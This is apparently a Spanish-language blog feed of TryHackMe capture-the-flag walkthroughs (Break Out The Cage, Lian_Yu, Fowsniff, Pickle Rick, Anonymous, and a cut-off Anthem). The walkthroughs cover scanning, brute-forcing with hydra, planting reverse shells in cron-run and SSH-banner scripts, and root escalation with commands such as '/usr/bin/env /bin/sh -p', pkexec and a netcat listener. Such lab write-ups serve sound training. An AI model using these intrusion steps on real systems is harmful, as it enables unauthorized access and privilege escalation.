/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 125 -x php,html,txt /images (Status: 301) /html (Status: 301) /scripts (Status: 301) /index.html (Status: 200) /contracts (Status: 301) /auditions (Status: 301)   Encontramos un directorio en donde hay un archivo mp3.\nUtilizamos Sonic Visualiser para verificar que el archivo no tenga algo dentro agregando una capa de espectrograma. Logramos ver una palabra que seguramente nos servira. Puede que alguna de las letras sea engañosa, audacity tambien trae la opcion de agregar una capa de espectrograma.\nFTP - Task 1 Nos conectamos al servicio FTP con las credenciales de anonymous:anonymous y encontramos un archivo que esta codificado en base64.\nUtilizamos CyberChef para decodificar el mensaje, al realizar esto vemos el mensaje \u0026ldquo;descompuesto\u0026rdquo;. Utilizamos Vigenere Cipher con la palabra que encontramos para obtener el mensaje real. Task 1\nUSER - WESTON -\u0026gt; CAGE Ahora que encontramos la contraseña de weston iniciamos sesion en el servicio ssh. Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando /usr/bin/bees. El archivo contiene un comando, pero este no puede ser editado por el usuario actual.\nUtilizamos pspy64 para ver si existe algun cronjob en la maquina, esto porque durante la enumeracion de los archivos se imprimia un mensaje diferente en pantalla.\nEncontramos un archivo que se ejecuta y se encuentra en el directorio /opt/.\nEl codigo del script en python lee el archivo .quotes en el que hay una larga lista de frases, elige una aleatoria, la imprime mediante el comando wall.\nPara poder tomar ventaja de este script deberia de quedar de la siguiente forma para poder ejecutar comandos y una posible shell inversa.\nRenombramos el archivo .quotes, creamos uno nuevo con una frase y nuestra shell inversa.\nPonemos a la escucha netcat en nuestra maquina, esperamos, y logramos obtener una shell con el usuario cage.\nY nuestra flag user.txt.\nPRIVILEGE ESCALATION En la carpeta principal de cage encontramos el archivo id_rsa que nos da acceso a una shell en el servicio ssh. En la carpeta email_backup encontramos varios correos en tres archivos. En uno de ellos hablan sobre una nota y lo que esta decia.\nIntentamos utilizarla como contraseña del usuario root pero no funcionó, por lo que utilizamos nuevamente vignere cipher pero esta vez no teniamos la clave y utilizamos dcode.fr ya que nos muestra una lista de posibles claves y su resultado. Logramos encontrar su clave y el mensaje real.\nUtilizamos el mensaje real como contraseña del usuario root y logramos obtener acceso con este usuario, además encontramos nuevamente un backup de correos en su carpeta principal y en uno de ellos nuestra flag *root.txt.\n","description":"","id":16,"section":"posts","tags":["linux"],"title":"TryHackMe - Break Out The Cage","uri":"https://sckull.github.io/posts/breakthecage/"},{"content":"Lian_Yu es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Lian_Yu     Room Lian_Yu   Info A beginner level security challenge   Puntos 180   Dificultad Facil   Maker Deamon    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), 80 (http) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59  # Nmap 7.80 scan initiated Sat Jun 27 01:14:57 2020 as: nmap -sV -o nmap_scan_mini lianyu.thm Nmap scan report for lianyu.thm (10.10.79.149) Host is up (0.15s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.2 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0) 80/tcp open http Apache httpd 111/tcp open rpcbind 2-4 (RPC #100000) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 27 01:15:31 2020 -- 1 IP address (1 host up) scanned in 33.78 seconds # Nmap 7.80 scan initiated Sat Jun 27 01:15:08 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan lianyu.thm Warning: 10.10.79.149 giving up on port because retransmission cap hit (6). Nmap scan report for lianyu.thm (10.10.79.149) Host is up (0.15s latency). Not shown: 65517 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.2 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0) | ssh-hostkey: | 1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e🇩🇪87:f4 (DSA) | 2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA) | 256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA) |_ 256 3f:43:76:75:a8:5a:a6💿33:b0:66:42:04:91:fe:a0 (ED25519) 80/tcp open http Apache httpd |_http-server-header: Apache |_http-title: Purgatory 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 35854/udp6 status | 100024 1 39587/tcp6 status | 100024 1 40288/udp status |_ 100024 1 47359/tcp status 7573/tcp filtered unknown 8324/tcp filtered unknown 12786/tcp filtered unknown 14426/tcp filtered unknown 18334/tcp filtered unknown 24024/tcp filtered unknown 27137/tcp filtered unknown 37836/tcp filtered unknown 40619/tcp filtered unknown 47359/tcp open status 1 (RPC #100024) 49276/tcp filtered unknown 54432/tcp filtered unknown 56048/tcp filtered unknown 60898/tcp filtered unknown Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 27 01:41:23 2020 -- 1 IP address (1 host up) scanned in 1574.59 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3  root@upset:~/thm/lianyu# gobuster dir -u http://lianyu.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 250 -x php,html,txt /index.html (Status: 200) /island (Status: 301)   Encontramos una pagina donde hay una palabra clave.\nNuevamente ejecutamos GOBUSTER en este directorio nuevo.\n1 2 3  root@upset:~/thm/lianyu# gobuster dir -u http://lianyu.thm/island/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 100 -x php,html,txt /index.html (Status: 200) /2100 (Status: 301)   En el nuevo directorio encontramos un video de YouTube incrustado en la pagina.\nEn el codigo fuente de esta pagina encontramos un comentarios que indica que podemos aprovechar nuestro .ticket.\nIntentamos ejecutar nuevamente GOBUSTER sobre este directorio para ver si encontramos algun otro directorio o pagina, pero no logramos. Por lo que agregamos ticket como una extension en gobuster. Al hacer esto encontramos una nueva pagina, en la que muestra un \u0026ldquo;token\u0026rdquo;.\n1 2 3  root@upset:~/thm/lianyu# gobuster dir -u http://lianyu.thm/island/2100/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 100 -x php,html,txt,ticket /index.html (Status: 200) /green_arrow.ticket (Status: 200)   Utilizamos CyberChef para poder decodificar el token, utilizamos base32.\nFTP Ahora tenemos una palabra clave y un token, utilizamos ambos como credenciales en el servicio FTP y logramos obtener acceso.\nVemos varios archivos los cuales descargamos, la mayoria, imagenes. Al analizar las imagenes nos damos cuenta de que una de ellas aun teniendo la extension PNG sus magic numbers no son los que deberian.\nUtilizamos hexeditor para editar y agregar los magic numbers de una imagen PNG.\n89 50 4E 47 0D 0A 1A 0A STEGANOGRAFIA Al realizar los cambios vemos en la imagen una contraseña. Pero ¿para qué?.\nEn las imagenes que descargamos vemos una con extension jpg, inspeccionamos esta imagen para ver si existe un archivo dentro de esta, utilizando steghide junto a la contraseña. El resultado nos muestra que hay dos archivos.\nExtraemos los archivos y vemos un mensaje en uno de estos y lo que parece ser una contraseña en el otro.\nUSER - SSH Intentamos utilizar la contraseña que encontramos en el servicio SSH con el usuario de FTP, pero no logramos obtener acceso. Regresamos nuevamente a FTP, y revisamos el directorio actual, vemos que es en el home, intentamos regresar y vemos el nombre de el otro usuario.\nUtilizamos la contraseña con este usuario y logramos obtener acceso y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando pkexec. Utilizamos pkexec para obtener una shell root.\nObtenemos una shell con usuario root y nuestra flag root.txt.\n","description":"","id":17,"section":"posts","tags":["linux"],"title":"TryHackMe - Lian_Yu","uri":"https://sckull.github.io/posts/lianyu/"},{"content":"Fowsniff CTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Fowsniff CTF     Info Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!   Puntos 450   Dificultad Facil   Maker ben    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto 80 (http), imap/pop3 (110,143) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  # Nmap 7.80 scan initiated Mon Jun 22 18:36:02 2020 as: nmap -sV -o nmap_scan_mini fowsniff.thm Nmap scan report for fowsniff.thm (10.10.225.64) Host is up (0.16s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 110/tcp open pop3 Dovecot pop3d 143/tcp open imap Dovecot imapd Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jun 22 18:36:34 2020 -- 1 IP address (1 host up) scanned in 31.57 seconds # Nmap 7.80 scan initiated Mon Jun 22 18:35:44 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan fowsniff.thm Nmap scan report for fowsniff.thm (10.10.225.64) Host is up (0.18s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd🇩🇪aa:4e:03:23 (RSA) | 256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA) |_ 256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Fowsniff Corp - Delivering Solutions 110/tcp open pop3 Dovecot pop3d |_pop3-capabilities: TOP SASL(PLAIN) UIDL USER AUTH-RESP-CODE PIPELINING CAPA RESP-CODES 143/tcp open imap Dovecot imapd |_imap-capabilities: IMAP4rev1 AUTH=PLAINA0001 SASL-IR Pre-login IDLE post-login have OK LITERAL+ more ENABLE capabilities LOGIN-REFERRALS ID listed Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jun 22 18:53:29 2020 -- 1 IP address (1 host up) scanned in 1065.82 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\nroot@upset:~/thm/fowsniff# gobuster dir -u http://fowsniff.thm/ -w /usr/share/wordlists/dirb/common.txt -q -x php,html,txt -t 25 /assets (Status: 301) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /LICENSE.txt (Status: 200) /README.txt (Status: 200) /robots.txt (Status: 200) /robots.txt (Status: 200) /security.txt (Status: 200) /server-status (Status: 403) Security.txt Encontramos un archivo en el que indica que la pagina/empresa fue hackeada.\nTwitter Fowsniff Dentro de la pagina vemos un mensaje que indica que Fowsniff sufrio una filtracion de datos de la empresa, incluyendo la cuenta de twitter.\nEn la cuenta encontramos dos tweets con direcciones hacia pastebin.\nEn uno de estos encontramos una lista de emails y hashes md5.\nUtilizamos crackstation.net para crackear estos hashes. Logramos obtener el resultado de la mayoria de hashes.\nHYDRA/TELNET - POP3 Utilizamos hydra con los usuarios y constraseñas que encontramos. Y logramos obtener unas credenciales que podemos utilizar en este servicio.\nUtilizamos telnet con el puerto 110 para conectarnos y utilizando los comandos de POP3\nPrimer correo Encontramos en uno de los correos una contraseña temporal para conectarse en el servicio SSH.\nroot@upset:~/thm/fowsniff# telnet fowsniff.thm 110 Trying 10.10.225.64... Connected to fowsniff.thm. Escape character is '^]'. +OK Welcome to the Fowsniff Corporate Mail Server! USER [... spoiler ...] +OK PASS [... spoiler ...] +OK Logged in. STAT +OK 2 2902 LIST +OK 2 messages: 1 1622 2 1280 . RETR 1 +OK 1622 octets Return-Path: \u0026lt;[... spoiler ...]\u0026gt; X-Original-To: [... spoiler ...]@fowsniff Delivered-To: [... spoiler ...]@fowsniff Received: by fowsniff (Postfix, from userid 1000) id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT) To: [... spoiler ...] Subject: URGENT! Security EVENT! Message-Id: \u0026lt;20180313185107.0FA3916A@fowsniff\u0026gt; Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT) From: stone@fowsniff (stone) Dear All, A few days ago, a malicious actor was able to gain entry to our internal email systems. The attacker was able to exploit incorrectly filtered escape characters within our SQL database to access our login credentials. Both the SQL and authentication system used legacy methods that had not been updated in some time. We have been instructed to perform a complete internal system overhaul. While the main systems are \u0026quot;in the shop,\u0026quot; we have moved to this isolated, temporary server that has minimal functionality. This server is capable of sending and receiving emails, but only locally. That means you can only send emails to other users, not to the world wide web. You can, however, access this system via the SSH protocol. The temporary password for SSH is \u0026quot;[... spoiler ...]\u0026quot; You MUST change this password as soon as possible, and you will do so under my guidance. I saw the leak the attacker posted online, and I must say that your passwords were not very secure. Come see me in my office at your earliest convenience and we'll set it up. Thanks, A.J Stone Segundo correo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  RETR 2 +OK 1280 octets Return-Path: \u0026lt;[... spoiler ...]\u0026gt; X-Original-To: [... spoiler ...] Delivered-To: [... spoiler ...] Received: by fowsniff (Postfix, from userid 1004) id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT) To: [... spoiler ...] Subject: You missed out! Message-Id: \u0026lt;20180313185405.101CA1AC2@fowsniff\u0026gt; Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT) From: [... spoiler ...] Devin, You should have seen the brass lay into AJ today! We are going to be talking about this one for a looooong time hahaha. Who knew the regional manager had been in the navy? She was swearing like a sailor! I don\u0026#39;t know what kind of pneumonia or something you brought back with you from your camping trip, but I think I\u0026#39;m coming down with it myself. How long have you been gone - a week? Next time you\u0026#39;re going to get sick and miss the managerial blowout of the century, at least keep it to yourself! I\u0026#39;m going to head home early and eat some chicken soup. I think I just got an email from Stone, too, but it\u0026#39;s probably just some \u0026#34;Let me explain the tone of my meeting with management\u0026#34; face-saving mail. I\u0026#39;ll read it when I get back. Feel better, Skyler PS: Make sure you change your email password. AJ had been telling us to do that right before Captain Profanity showed up.   USER - BAKSTEEN Nuevamente utilizamos hydra con los usuarios y la contraseña nueva que econtramos pero esta vez en el servicio ssh.\nEncontramos la contraseña del usuario baksteen.\nIniciamos sesion en el servicio ssh y obtenemos una shell.\nPRIVILEGE ESCALATION Dentro de nuestra shell buscamos archivos que fuera interesantes que nos ayudaran a escalar privilegios, encontramos un archivo interesante en la carpeta /opt/. Al revisar este archivo encontramos que es el \u0026ldquo;banner\u0026rdquo; del servicio SSH y además el dueño del archivo es el usuario PAREDE.\nRevisamos los archivos que pertenecen al \u0026ldquo;banner\u0026rdquo; y vemos que sí se ejecuta. Pero este archivo que ejecuta el archivo en /opt/ es el usuario root.\nYa que el archivo es un script en bash, vamos a agregar una shell inversa, que al iniciar nuevamente con el usuario BAKSTEEN en el servicio SSH se ejecuta. Logramos obtener una shell con usuario root.\nAdemás vemos nuestra flag.txt en la carpeta principal de root.\n","description":"","id":18,"section":"posts","tags":["linux"],"title":"TryHackMe - Fowsniff CTF","uri":"https://sckull.github.io/posts/fowsniff/"},{"content":"Pickle Rick es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Pickle Rick     Room Pickle Rick   Info A Rick and Morty CTF. Help turn Rick back into a human!   Puntos 90   Dificultad Facil   Maker tryhackme    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80), y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  # Nmap 7.80 scan initiated Sun Jun 21 01:49:13 2020 as: nmap -sV -o nmap_scan_mini picklerick.thm Nmap scan report for picklerick.thm (10.10.196.129) Host is up (0.19s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Jun 21 01:49:46 2020 -- 1 IP address (1 host up) scanned in 32.90 seconds # Nmap 7.80 scan initiated Sun Jun 21 01:49:14 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan picklerick.thm Nmap scan report for picklerick.thm (10.10.196.129) Host is up (0.17s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 84:2d:fc:6a:81:e4:da:21:a5:b8:8f:0f:3c:8d:74:1a (RSA) | 256 e5:aa:df:44:6c:ad:56:d0:91:d0:43:c8:a8:30:4c:2d (ECDSA) |_ 256 b9:24:ea:f6:3b:3c:ba:14:58:bb:e8:7b:6c:2c:1b:53 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Rick is sup4r cool Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Jun 21 02:05:52 2020 -- 1 IP address (1 host up) scanned in 997.58 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8  root@upset:~/thm/picklerick# gobuster dir -u http://picklerick.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt /assets (Status: 301) /denied.php (Status: 302) /index.html (Status: 200) /login.php (Status: 200) /portal.php (Status: 302) /robots.txt (Status: 200) /server-status (Status: 403)   En el codigo fuente de la pagina principal encontramos un comentario que indica un nombre de usuario.\nEn el archivo robots.txt encontramos una frase.\nEn la pagina login.php encontramos un panel de inicio de sesion.\nUtilizamos el usuario que encontramos con la frase en robots.txt y logramos obtener acceso al portal de la pagina.\nIngredientes En el portal encontramos un input en el que podemos ejecutar comandos.\nListamos los comandos pero no podemos utilizar cat al parecer esta bloqueado, pero podemos utilizar less para leer los archivos por lo que podemos leer los archivos del sistema y de la pagina, y vemos los comandos que no estan permitidos.\nPrimer Ingrediente Encontramos el Primer Ingrediente en el directorio actual.\nSegundo Ingrediente El Segundo Ingrediente lo encontramos en el directorio principal de rick, pero el dueño del archivo es el usuario root.\nHacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar cualquier comando sin contraseña.\nCon sudo less podemos leer el Segundo Ingrediente.\nTercer Ingrediente En el directorio principal del usuario root encontramos el Tercer Ingrediente.\nTercer Ingrediente.\n","description":"","id":19,"section":"posts","tags":["linux"],"title":"TryHackMe - Pickle Rick","uri":"https://sckull.github.io/posts/picklerick/"},{"content":"Anonymous es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Anonymous     Info Not the hacking group   Puntos 430   Dificultad Media   Maker Nameless0ne    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), smb (445, 139) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67  # Nmap 7.80 scan initiated Sat Jun 20 23:42:51 2020 as: nmap -sV -o nmap_scan_mini anonymous.thm Nmap scan report for anonymous.thm (10.10.243.66) Host is up (0.15s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 20 23:43:24 2020 -- 1 IP address (1 host up) scanned in 32.72 seconds # Nmap 7.80 scan initiated Sat Jun 20 23:52:25 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan anonymous.thm Nmap scan report for anonymous.thm (10.10.243.66) Host is up (0.16s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_drwxrwxrwx 2 111 113 4096 Jun 21 04:41 scripts [NSE: writeable] | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.6.160 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA) | 256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA) |_ 256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: anonymous | NetBIOS computer name: ANONYMOUS\\x00 | Domain name: \\x00 | FQDN: anonymous |_ System time: 2020-06-21T05:05:33+00:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-06-21T05:05:33 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Jun 21 00:05:40 2020 -- 1 IP address (1 host up) scanned in 795.29 seconds   FTP Mediante el servicio ftp en el puerto 21 ingresamos como anonymous (anonymous:anonymous) y pudimos listar los archivos y carpetas de la maquina, además descargarlos.\n  En el archivo clean.sh encontramos un script en bash el cual elimina los archivos que se encuentran en la carpeta /tmp/.\n  El segundo archivoremoved_files.log que tiene el log de archivos que se han eliminado por el script clean.sh.\n  Por ultimo está el archivo to_do.txt, muestra un mensaje que seguramente algun usuario escribió.\n  SMB Utilizamos smbclient para obtener informacion del servicio SAMBA en donde encontramos algunos SHARENAMES.\nEn el SHARENAME pics es el unico en donde logramos entrar sin credenciales, en donde encontramos dos imagenes.\nEn el servicio SAMBA no logramos hacer nada, ya que solo tenemos el permiso de LISTAR\nFTP - USER Volvimos nuevamente al servicio FTP. Dentro de este servicio tenemos permisos para subir archivos, logramos subir un archivo de prueba.\nEn la carpeta a la que tenemos acceso hay un script (clean.sh) descrito anteriormente, intentamos reemplazar este archivo, en el que pusimos un pequeño comando de ping (ping -c 5 10.10.10.10) hacia nuestra IP. Hacemos esto ya que consideramos que alguien debe de ejecutar el script para poder limpiar la carpeta /tmp/, además que el archivo de log (removed_files.log) del script, cada vez tiene más lineas.\nSubimos el archivo y con tcpdump capturamos el trafico de ping (icmp).\nLogramos obtener respuesta desde la maquina hacia la nuestra, por lo que sabemos que el script es ejecutado, probablemente por un cronjob.\nVolvemos a sobreescribir el archivo clean.sh pero esta vez con una shell inversa. Ponemos a la escucha nuestra maquina (nc -lvp 1338).\nLogramos obtener una shell y nuestra flag user.txt.\nAdemás, podemos ver el cronjob que se ejecuta en la maquina.\nPRIVILEGE ESCALATION Hacemos una enumeracion de binarios SUID con find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah y vemos que existe env en la maquina. Utilizamos env para obtener una shell root.\nEjecutamos /usr/bin/env /bin/sh -p, obtenemos una shell como usuario root y nuestra flag root.txt.\n","description":"","id":20,"section":"posts","tags":["linux"],"title":"TryHackMe - Anonymous","uri":"https://sckull.github.io/posts/anonymous/"},{"content":"Anthem es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Anthem     Room Anthem   Info Exploit a Windows machine in this beginner level challenge.   Puntos 670   Dificultad Facil   Maker Chevalier    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto rdp (3389) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67  # Nmap 7.80 scan initiated Sat Jun 20 18:56:03 2020 as: nmap -sV -o nmap_scan_mini anthem.thm Nmap scan report for anthem.thm (10.10.109.143) Host is up (0.19s latency). Not shown: 995 closed ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 20 18:58:39 2020 -- 1 IP address (1 host up) scanned in 156.11 seconds # Nmap 7.80 scan initiated Sat Jun 20 20:27:23 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan anthem.thm Warning: 10.10.194.228 giving up on port because retransmission cap hit (6). Nmap scan report for anthem.thm (10.10.194.228) Host is up (0.18s latency). Not shown: 65520 closed ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | http-robots.txt: 4 disallowed entries |_/bin/ /config/ /umbraco/ /umbraco_client/ |_http-title: Anthem.com - Welcome to our blog 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: WIN-LU09299160F | NetBIOS_Domain_Name: WIN-LU09299160F | NetBIOS_Computer_Name: WIN-LU09299160F | DNS_Domain_Name: WIN-LU09299160F | DNS_Computer_Name: WIN-LU09299160F | Product_Version: 10.0.17763 |_ System_Time: 2020-06-21T01:45:48+00:00 | ssl-cert: Subject: commonName=WIN-LU09299160F | Not valid before: 2020-04-04T22:56:38 |_Not valid after: 2020-10-04T22:56:38 |_ssl-date: 2020-06-21T01:45:58+00:00; 0s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 20106/tcp filtered unknown 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-06-21T01:45:49 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 20 20:45:59 2020 -- 1 IP address (1 host up) scanned in 1116.48 seconds   HTTP Pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  root@upset:~/thm/anthem# gobuster dir -u http://anthem.thm -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt /Archive (Status: 301) /archive (Status: 301) /authors (Status: 200) /Blog (Status: 200) /blog (Status: 200) /categories (Status: 200) /install 